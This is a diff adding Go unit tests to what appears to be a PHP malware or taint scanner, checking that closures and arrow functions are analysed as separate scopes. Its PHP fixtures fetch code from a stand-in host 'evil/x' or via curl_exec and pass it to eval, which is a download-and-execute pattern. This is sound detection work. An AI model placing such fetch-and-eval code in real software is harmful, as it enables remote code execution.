@@ -588,6 +588,115 @@ eval( $tmp );`)
 	}
 }
 
+// TestClosureParameterShadowDoesNotLeak is the closure sibling of the
+// function-parameter case: a closure parameter sharing the outer tainted
+// variable's name must not inherit that taint, because the closure body is
+// its own scope now, exactly like a named function's body already is.
+func TestClosureParameterShadowDoesNotLeak(t *testing.T) {
+	src := b64(`<?php
+$data = file_get_contents('http://evil/x');
+add_action('init', function ($data) { eval($data); });`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) != 0 {
+		t.Fatalf("false positive: %+v", rep.Results)
+	}
+}
+
+// TestClosureLocalReassignmentDoesNotLeak is the damaging false positive: no
+// remote value reaches the sink at all. Without the closure's body being its
+// own scope, the flow-insensitive fixpoint over one flat scope sees both the
+// outer remote assignment and the closure's own local literal reassignment
+// to the identically-named variable, and taints it regardless of order.
+func TestClosureLocalReassignmentDoesNotLeak(t *testing.T) {
+	src := b64(`<?php
+$tpl = file_get_contents('http://evil/x');
+register_shutdown_function(function () { $tpl = __DIR__ . '/local.php'; include $tpl; });`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) != 0 {
+		t.Fatalf("false positive: %+v", rep.Results)
+	}
+}
+
+// TestArrowFunctionParameterShadowDoesNotLeak is the arrow-function sibling
+// of TestClosureParameterShadowDoesNotLeak. An arrow function's body is a
+// single expression rather than a statement list, so this also exercises
+// that the exclusion and per-scope analysis mechanism handles that shape.
+func TestArrowFunctionParameterShadowDoesNotLeak(t *testing.T) {
+	src := b64(`<?php
+$code = file_get_contents('https://evil/x');
+$f = fn($code) => eval($code);`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) != 0 {
+		t.Fatalf("false positive: %+v", rep.Results)
+	}
+}
+
+// TestClosureFlowStillDetected is the false-negative guard for
+// TestClosureParameterShadowDoesNotLeak and TestClosureLocalReassignmentDoesNotLeak:
+// a genuine fetch-to-sink flow entirely inside a closure body must still be
+// found once that body is analysed as its own scope, the same way a flow
+// entirely inside a named function's body already is.
+func TestClosureFlowStillDetected(t *testing.T) {
+	src := b64(`<?php
+add_action('init', function ($u) { $c = curl_exec($u); eval($c); });`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) == 0 {
+		t.Fatal("false negative: genuine flow inside a closure was not detected")
+	}
+}
+
+// TestArrowFunctionFlowStillDetected is the arrow-function sibling of
+// TestClosureFlowStillDetected: a genuine flow entirely inside an arrow
+// function's single-expression body must still be found.
+func TestArrowFunctionFlowStillDetected(t *testing.T) {
+	src := b64(`<?php
+$f = fn($u) => eval(curl_exec($u));`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) == 0 {
+		t.Fatal("false negative: genuine flow inside an arrow function was not detected")
+	}
+}
+
+// TestClosureInsideFunctionInsideWrapperDoesNotLeak composes the closure
+// exclusion with the existing wrapper and function exclusions: a closure
+// nested inside a function, itself nested inside a control-flow wrapper,
+// must not let its own local leak into the identically-named local of the
+// function that declares it.
+func TestClosureInsideFunctionInsideWrapperDoesNotLeak(t *testing.T) {
+	src := b64(`<?php
+if ( true ) {
+	function outer( $h ) {
+		$tmp = 'safe literal';
+		register_shutdown_function( function () use ( $h ) {
+			$tmp = curl_exec( $h );
+		} );
+		eval( $tmp );
+	}
+}`)
+	rep := run(t, src)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if len(rep.Results) != 0 {
+		t.Fatalf("false positive: %+v", rep.Results)
+	}
+}
+
 // manyDeclSource builds n trivial class declarations followed by one
 // genuine curl_exec-to-eval flow, so a test can tell "this analyzed
 // correctly at scale" apart from "this merely returned quickly because
